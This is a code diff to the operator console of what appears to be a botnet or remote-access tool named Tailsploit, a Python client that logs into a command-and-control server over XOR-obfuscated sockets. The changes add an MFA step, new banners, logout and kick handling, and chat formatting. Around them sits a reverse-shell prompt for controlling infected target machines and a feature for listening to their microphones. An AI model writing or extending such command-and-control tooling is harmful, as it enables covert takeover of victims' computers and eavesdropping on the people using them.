@@ -6,6 +6,7 @@ from pyspin.spin import Box1, Spinner
 import os
 import threading
 import pyaudio
+import datetime
 import folium
 import requests
 
@@ -52,10 +53,13 @@ class AdminShell:
             print(
                 f"""
 
-                ┏┓┏┓┏┓┓┏  ┳┓┏┓┏┳┓┳┓┏┓┏┳┓
-                ┏┛┃┃┗┓┣┫━━┣┫┃┃ ┃ ┃┃┣  ┃ 
-                ┗┛┗┻┗┛┛┗  ┻┛┗┛ ┻ ┛┗┗┛ ┻ 
-                    github/{Fore.RED}devmalcolm{Style.RESET_ALL}
+
+                   ┏┳┓┏┓┳┓ ┏┓┏┓┓ ┏┓┳┏┳┓
+                    ┃ ┣┫┃┃ ┗┓┃┃┃ ┃┃┃ ┃ 
+                    ┻ ┛┗┻┗┛┗┛┣┛┗┛┗┛┻ ┻ 
+                    
+
+        github/{Fore.RED}devmalcolm{Style.RESET_ALL}
     """
             )
             spin = Spinner(Box1)
@@ -85,12 +89,26 @@ class AdminShell:
             ).decode("utf-8")
             self.OnAuthenticationChecking(OnAuthenticationResult, AdminShellSocket)
 
-        except:
-            print("\n")
-            print(
-                f"    [{Fore.RED}-{Style.RESET_ALL}] Unable to reach the server : {Back.RED} NOT REACHABLE {Style.RESET_ALL}"
-            )
-            print("\n")
+        except KeyboardInterrupt:  
+            CurrentTimeSession = datetime.datetime.now()
+            FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")
+            print("")
+            print(f'\n{Fore.RED}[*]{Style.RESET_ALL} Closing the active Tailsploit session...\n{Fore.RED}[*]{Style.RESET_ALL} Logout at {FormattedTimeSession}')
+        except Exception as e:
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print("")
+            print(f"""Error: The server is not {Fore.RED}reachable{Style.RESET_ALL} due to one of the following reasons:
+
+- You have been kicked or banned from the server.
+- Your access token has been revoked.
+- Your session has expired.
+- The server is currently shut down.
+
+Please check your status or contact the server administrator for further informations.
+""")
 
     def handleXOREncryption(self, content_data, key_traffic):
         # Repeat the key to match the data length
@@ -109,10 +127,11 @@ class AdminShell:
         ):
             print("")
             print(
-                f"[{Fore.BLUE}*{Style.RESET_ALL}] Botnet's connection status : {Back.GREEN} AUTHENTICATED {Style.RESET_ALL}"
+                f"{Fore.GREEN}[*]{Style.RESET_ALL} Provided authentication token is active, status : {Back.GREEN} AUTHENTICATED {Style.RESET_ALL}"
             )
+            time.sleep(2)
             self.isAuthenticated = True
-            self.adminShellSession(AdminShellSocket)
+            self.OnAuthenticationMFA(AdminShellSocket)
         elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_ALREADY_IN_USE":
             print("[-] The provided token is already in use, please use another one")
             self.isAuthenticated = False
@@ -126,6 +145,44 @@ class AdminShell:
             print(OnAuthenticationResult)
             self.isAuthenticated = False
             print("Error")
+        
+    def OnAuthenticationMFA(self, AdminShellSocket):
+        OnAuthenticationMFAStatusXOR = AdminShellSocket.recv(1024)
+        OnAuthenticationMFAStatus = self.handleXOREncryption(
+            OnAuthenticationMFAStatusXOR, self.TRAFFIC_ENCRYPTION_TOKEN
+        ).decode("utf-8")
+
+        if "--FLAG_MFA_REQUIRED" in OnAuthenticationMFAStatus:
+            while True:
+                print("")
+                AdminMFACode = input("> Multi-Factor Authentication (MFA) Code : ")
+                AdminMFACodeXOR = self.handleXOREncryption(AdminMFACode.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                AdminShellSocket.send(AdminMFACodeXOR)
+                OnAuthenticationMFAStatusAwaiting = AdminShellSocket.recv(1024)
+                OnAuthenticationMFAStatusAwaitingXOR = self.handleXOREncryption(
+                    OnAuthenticationMFAStatusAwaiting, self.TRAFFIC_ENCRYPTION_TOKEN
+                ).decode("utf-8")
+
+                if OnAuthenticationMFAStatusAwaitingXOR == "--FLAG_MFA_STATUS=200":
+                    print("")
+                    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Initiating the connection...")
+                    print("")
+                    time.sleep(2)
+                    self.adminShellSession(AdminShellSocket)
+                    break
+                elif OnAuthenticationMFAStatusAwaitingXOR == "--FLAG_MFA_STATUS=404":
+                    print("")
+                    print(f"{Fore.RED}[-]{Style.RESET_ALL} The MFA code provided is incorrect. Please verify and try again")
+                    time.sleep(5)
+                    continue
+            
+        elif "--FLAG_MFA_NOT_REQUIRED":
+            print("NOT REQUIRED")
+            self.adminShellSession(AdminShellSocket)
+        else:
+            print("[*] An error occured")
+        
+        print(OnAuthenticationMFAStatus)
 
     def play_audio(self, AdminShellSocket):
         global stream
@@ -213,36 +270,34 @@ class AdminShell:
         elif OnUsernameVerificationResult == "--FLAG_USERNAME_AVAILABLE":
             pass
         else:
-            print("An error occured")
+            pass
 
-        print(
-            f"""
+        CurrentTimeSession = datetime.datetime.now()
+        FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")
 
-                ┏┓┏┓┏┓┓┏  ┳┓┏┓┏┳┓┳┓┏┓┏┳┓
-                ┏┛┃┃┗┓┣┫━━┣┫┃┃ ┃ ┃┃┣  ┃ 
-                ┗┛┗┻┗┛┛┗  ┻┛┗┛ ┻ ┛┗┗┛ ┻ 
-                    github/{Fore.RED}devmalcolm{Style.RESET_ALL}
-
-
-            """
-        )
+        print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Login as: \x1B[4m{self.ADMIN_DISPLAY_NAME}\x1B[0m")
+        print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Session started at {FormattedTimeSession}")
+        print("")
         while self.isAuthenticated:
             if self.chat_mode:
-                message = input("You: ")
-                if message == "exitchat":
+                message = input("> ")
+                if message == "/exitchat":
                     self.exit_chat()  # Stop the chat thread
                     print("TERMINATED")
                     continue
+                elif message == "":
+                    continue
                 else:
                     self.send_chat_message(message, AdminShellSocket)
+                    print("\033[F\033[K", end="")
             else:
                 if self.TARGET_CLIENT:
                     adminShell = input(
-                        f"> {Fore.RED}reverseShell{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.BLUE}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.BLUE}{REVERSE_SHELL_PORT}{Style.RESET_ALL} {Fore.GREEN}${Style.RESET_ALL} "
+                        f"\x1B[4mtailsploit\x1B[0m ~ shell({Fore.RED}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.RED}{REVERSE_SHELL_PORT}{Style.RESET_ALL}) > "
                     )
                 else:
                     adminShell = input(
-                        f"> {Fore.RED}admin{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.GREEN}${Style.RESET_ALL} "
+                        f"\x1B[4mtailsploit\x1B[0m > "
                     )
             if adminShell == "":
                 continue
@@ -265,6 +320,14 @@ class AdminShell:
                 self.chat_thread = threading.Thread(target=self.receive_messages, args=(AdminShellSocket,))
                 #self.chat_thread.daemon = True
                 self.chat_thread.start()
+                if os.name == "nt":
+                    os.system("cls")
+                else:
+                    os.system("clear")
+
+                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Started Administrator Chat Mode Session.")
+                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Chat Encryption Type : XOR (Low-Level)")
+                print("\n")
                 continue
             else:
                 if self.TARGET_CLIENT:
@@ -308,7 +371,7 @@ class AdminShell:
                             )
                             if os.name == "nt":  # Windows
                                 os.system("cls")
-                            else:  # Linux, macOS, etc.
+                            else:
                                 os.system("clear")
                             print("")
                             print(
@@ -364,15 +427,14 @@ class AdminShell:
                             else:
                                 print("Microphone is not being listened to.")
                             break
-                        elif "--FLAG_KICKED_FROM_SERVER" in ServerShell:
+                        elif "--FLAG_LOGOUT_FROM_SERVER" in ServerShell:
+                            CurrentTimeSession = datetime.datetime.now()
+                            FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")
+                            raise Exception(f'\n{Fore.RED}[*]{Style.RESET_ALL} Closing the active Tailsploit session...\n{Fore.RED}[*]{Style.RESET_ALL} Logout at {FormattedTimeSession}')
                             
-                            print("")
-                            print(
-                                "[*] You have been kicked from the server by a server administrator."
-                            )
-                            print("")
-                            break
-                            sys.exit(1)
+                        elif "--FLAG_KICKED_FROM_SERVER" in ServerShell:
+                            raise Exception(f'\n{Fore.RED}[*]{Style.RESET_ALL} You have been kicked from the server by a server administrator.')
+
                         elif (
                             "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND"
                             in ServerShell
@@ -383,6 +445,8 @@ class AdminShell:
                             )
                             print("")
                             break
+                        elif "--FLAG_MESSAGE_MODE_ADMN_FORWARDED" in ServerShell:
+                            continue
                         elif (
                             "--FLAG_REVERSE_SHELL_INFO REVERSE_SHELL_HANDLER_STATUS?STOPPED"
                             in ServerShell
@@ -462,7 +526,8 @@ class AdminShell:
                             print("")
                             break
                 except Exception as e:
-                    pass
+                    print(e)
+                    sys.exit(1)
                 except KeyboardInterrupt:
                     print("[INFO] Admin terminated the connection.")
                     AdminShellSocket.close()
@@ -475,14 +540,20 @@ class AdminShell:
                 if not message:
                     break  # No data received, break the loop
                 messageDecoded = self.handleXOREncryption(message, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
-                print(f"Message: {messageDecoded}")
+                
+                if "--FLAG_MESSAGE_MODE_ADMN_FORWARDED" in messageDecoded:
+                    message_content = messageDecoded.replace("--FLAG_MESSAGE_MODE_ADMN_FORWARDED", "")
+                    print(f"{message_content}")
+                else:
+                    pass
             except BlockingIOError:
                 pass  # No data available, continue loop
         AdminShellSocket.setblocking(True)  # Set socket back to blocking mode
 
 
+
     def send_chat_message(self, message, AdminShellSocket):
-        formatted_message = f"{self.ADMIN_DISPLAY_NAME}: {message}"
+        formatted_message = f"--FLAG_MESSAGE_MODE_ADMN {message}"
         encrypted_message = self.handleXOREncryption(formatted_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         AdminShellSocket.send(encrypted_message)
 
